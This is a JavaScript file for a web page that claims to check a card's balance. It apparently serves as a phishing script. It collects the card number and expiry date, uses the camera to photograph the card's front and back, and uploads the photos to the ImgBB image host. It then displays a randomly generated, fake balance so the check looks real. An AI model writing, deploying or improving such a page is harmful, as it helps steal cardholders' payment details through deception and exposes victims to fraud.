// js/balance.js
console.log("Camera script loaded");

let stream = null;
let frontBlob = null;
let backBlob = null;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page ready");

  const form = document.getElementById("balanceForm");
  const submitBtn = document.getElementById("submitBtn");
  const label = submitBtn.querySelector("[data-label]");
  const spinner = submitBtn.querySelector("[data-spinner]");
  const status = document.getElementById("submitStatus");

  // Format expiry
  document.getElementById("expiry_date").addEventListener("input", (e) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    e.target.value = v.slice(0, 5);
  });

  // Open Dual Camera
  document.getElementById("openCameraBtn").addEventListener("click", async () => {
    document.getElementById("dualCaptureBlock").classList.remove("hidden");
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      const track = stream.getVideoTracks()[0];
      document.getElementById("dualVideoFront").srcObject = new MediaStream([track.clone()]);
      document.getElementById("dualVideoBack").srcObject = new MediaStream([track]);
    } catch (err) {
      alert("Camera not available. Use mobile or allow camera.");
      console.error(err);
    }
  });

  // Close Dual
  document.getElementById("dualCloseBtn").addEventListener("click", () => {
    document.getElementById("dualCaptureBlock").classList.add("hidden");
    if (stream) stream.getTracks().forEach(t => t.stop());
  });

  // Capture Front
  document.getElementById("captureFrontBtn").addEventListener("click", () => {
    capture("dualVideoFront", "frontPreview", b => frontBlob = b);
  });

  // Capture Back
  document.getElementById("captureBackBtn").addEventListener("click", () => {
    capture("dualVideoBack", "backPreview", b => backBlob = b);
  });

  function capture(videoId, imgId, callback) {
    const video = document.getElementById(videoId);
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      document.getElementById(imgId).src = URL.createObjectURL(blob);
      document.getElementById(imgId).classList.remove("hidden");
      callback(blob);
    }, "image/jpeg");
  }

  // Upload to ImgBB
  const IMGBB_KEY = "YOUR_KEY"; // Get at imgbb.com
  async function upload(blob) {
    const fd = new FormData();
    fd.append("image", blob);
    const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: fd });
    const json = await res.json();
    return json.data.url;
  }

  // Submit
  document.getElementById("finishAndSubmitBtn").addEventListener("click", submit);
  form.addEventListener("submit", e => { e.preventDefault(); submit(); });

  async function submit() {
    submitBtn.disabled = true;
    label.classList.add("opacity-60");
    spinner.classList.remove("hidden");
    status.textContent = "Checking...";

    try {
      let frontUrl = "", backUrl = "";
      if (frontBlob) frontUrl = await upload(frontBlob);
      if (backBlob) backUrl = await upload(backBlob);

      document.getElementById("front_image_url").value = frontUrl;
      document.getElementById("back_image_url").value = backUrl;

      console.log("Submitted:", {
        card: form.card_number.value,
        front: frontUrl,
        back: backUrl
      });

      setTimeout(() => {
        document.getElementById("balanceText").textContent = `Balance: $${(Math.random() * 100 + 20).toFixed(2)}`;
        document.getElementById("result").classList.remove("hidden");
        status.textContent = "Done!";
      }, 1500);

    } catch (err) {
      status.textContent = "Error";
      console.error(err);
    } finally {
      setTimeout(() => {
        submitBtn.disabled = false;
        label.classList.remove("opacity-60");
        spinner.classList.add("hidden");
      }, 2000);
    }
  }
});
